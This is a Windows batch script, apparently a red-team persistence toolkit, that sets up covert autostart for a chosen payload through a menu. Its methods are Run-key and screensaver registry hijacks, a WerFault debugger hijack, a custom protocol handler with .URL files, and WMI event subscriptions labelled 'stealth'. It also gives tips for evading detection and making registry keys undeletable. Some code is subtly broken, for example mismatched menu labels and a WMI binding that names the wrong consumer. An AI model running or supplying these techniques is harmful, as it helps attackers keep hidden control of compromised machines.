@echo off
:menu
cls
chcp 65001
echo ⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
echo ⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
echo ⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
echo ⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
echo ⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
echo ⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
echo ⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
echo ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕      By Eyna Version 1.0
echo ⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
echo ⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
echo ⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
echo ⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
echo ⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
echo ⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣
echo ==============================

echo [+] Current user privilege: && whoami /groups | find "S-1-16-12288" >nul && echo Admin || echo Not admin
 
echo ==============================
echo     Persistence Main Menu
echo ==============================
echo 1. Registry-Runkey (HKCU) 
echo 2. Registry-Winlogon (HKCU) 
echo 3. Registry-ScreenSaver (HKCU) 
echo 4. Url-File Creation + DLL URL Exec Help (.URL)
echo 5. Registry-Werfault (Admin - HKLM)
echo 6. Bring Your Own Protocol Handler + URL-File 
echo 7. WMI Stealth Persistence
echo 8. Guides For Persistence
echo 9. Exit
echo ==============================
set /p choice="Enter your choice (1-4): "



if "%choice%"=="1" goto option1
if "%choice%"=="2" goto option2
if "%choice%"=="3" goto option3
if "%choice%"=="4" goto option4
if "%choice%"=="5" goto option5
if "%choice%"=="6" goto option6
if "%choice%"=="7" goto option7
if "%choice%"=="8" goto option8
if "%choice%"=="9" goto end



echo Invalid choice. Press any key to try again...
pause > nul
goto menu




:option1
cls
echo You selected Option Runkey Registry Add.
echo ==============================
set /p RegName="Enter Registry name to create: "
set /p ExecPath="Enter Path To Your Executable: "
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v %RegName% /t REG_SZ /d %ExecPath% /f
echo ==============================
echo Checking The Registry Key Created:
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v %RegName%
echo ==============================
echo Press Enter to go back to menu...
pause > nul
goto menu



:option2
cls
echo You selected Option Winlogon Registry Add.
echo ==============================
set /p RegName="Enter Registry name to create: "
set /p ExecPath="Enter Path To Your Executable: "
reg add HKEY_CURRENT_USER\Environment /v %RegName% /d %ExecPath% /t REG_SZ /f
echo ==============================
echo Checking The Registry Key Created:
reg query HKEY_CURRENT_USER\Environment /v %RegName%
echo Press Enter to go back to menu...
pause > nul
goto menu



:option3
cls
echo You selected ScreenSaver Registry Add.
echo ==============================
set /p ExecPath="Enter Path To Your Executable: "
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d %ExecPath% /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "10" /f
echo ==============================
echo Checking The Registry Key Created:
reg query "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE"
reg query "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut"
echo Press any key to return to the menu...
pause > nul
goto menu




:option4
cls
echo You selected Url-File Creation.
set /p SavePath="Enter Path To Save .url file (include output name eg : C:\Test.url): "
echo [InternetShortcut] > %SavePath%
echo URL=file:///%SavePath% >> %SavePath%
echo ==============================
IF EXIST "%SavePath%" (
    ECHO URL File Created in => %SavePath%
    ECHO You can run this With url also ---- Use:  rundll32 c:\windows\system32\url.dll,OpenURL %SavePath%
) ELSE (
    ECHO Fail to Create Url file.
)
echo ==============================
echo Press any key to return to the menu...
pause > nul
goto menu





:option5
cls
echo You selected Registry-Werfault.
set /p ExecPath="Enter Path To Save .url file (include output name eg : C:\Test.url): "
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" /v ReflectDebugger /t REG_SZ /d %ExecPath% /f
echo ==============================
echo Checking The Registry Key Created:
reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" /v "ReflectDebugger"
echo ==============================
echo Completed. Now you can run werfault with === werfault.exe -pr 4
echo Press any key to return to the menu...
pause > nul
goto menu

:option6
cls
echo You selected Bring Your Own Protocol Handler + URL.
echo ==============================

:getRegName
set "REGNAME="
set /p "REGNAME=Enter Registry Protocol handler name (letters/numbers/-/_ only): "
if not defined REGNAME goto menu

:: Simple validation: allow only A-Z a-z 0-9 - _
echo %REGNAME%| findstr /r "^[a-zA-Z0-9_-]*$" >nul || (
    echo Invalid characters. Use only letters, numbers, dash or underscore.
    goto getRegName
)

:getSavePath
set "SavePath="
set /p "SavePath=Enter full path to save .url file (e.g. C:\Test.url): "
if not defined SavePath goto menu

:: Create parent folder if needed
for %%i in ("%SavePath%") do mkdir "%%~dpi" 2>nul

:getPayload
set "ExecPath="
set /p "ExecPath=Enter full path to payload file: "
if not defined ExecPath goto menu
if not exist "%ExecPath%" (
    echo ERROR: File not found - "%ExecPath%"
    goto getPayload
)

echo ==============================
:: Add registry keys (all paths quoted)
reg add "HKCU\Software\Classes\%REGNAME%" /ve /t REG_SZ /d "URL:%REGNAME% Protocol" /f
reg add "HKCU\Software\Classes\%REGNAME%" /v "URL Protocol" /t REG_SZ /d "" /f
:: The command runs the payload, passing the URL as argument
reg add "HKCU\Software\Classes\%REGNAME%\shell\open\command" /ve /t REG_SZ /d "\"%ExecPath%\" \"%%1\"" /f

echo ==============================
echo [!] Checking the registry key:
reg query "HKCU\Software\Classes\%REGNAME%\shell\open\command" /ve
echo ==============================

:: Create .url file
(
  echo [InternetShortcut]
  echo URL=%REGNAME%://
) > "%SavePath%"

if exist "%SavePath%" (
    echo URL file created: %SavePath%
    echo You can test it with: rundll32 url.dll,OpenURL "%SavePath%"
) else (
    echo Failed to create URL file.
)

echo ==============================
echo Press any key to return to the menu...
pause > nul
goto menu


:option7
cls
echo You selected WMI Stealth Persistence.
echo ==============================
set /p WON="WMI Object Name: "
set /p PathExec="Payload Full Path: "
set /p Delay="WMI Execution Delay (minutes): "
set /a Delay=%Delay% * 60
echo ==============================
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="%WON%", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN %Delay% WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="%WON%", CommandLineTemplate="%PathExec%"
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"%WON%\"", Consumer="CommandLineEventConsumer.Name=\"SecurityConsumer\""
echo ==============================
echo Press any key to return to the menu...
pause > nul
goto menu

:option8
cls
echo You selected Guides.
echo ==============================
echo [1] For Undetectable Executables Use --- c:\windows\system32\cmd.exe /c start "c:\windows\explorer.exe -Path to executable-"
echo [2] SharpHide Tool for undeletable registry key Use --- sharphide.exe action=create keyvalue= -Path to executable-
echo [3] Registry execution format Order for default apps --- .COM .EXE .BAT .CMD .VBS .VBE .JS .JSE .WSF .WSH .MSC


echo Press any key to return to the menu...
pause > nul
goto menu


:end
cls
echo Thank you for using the menu. Goodbye!
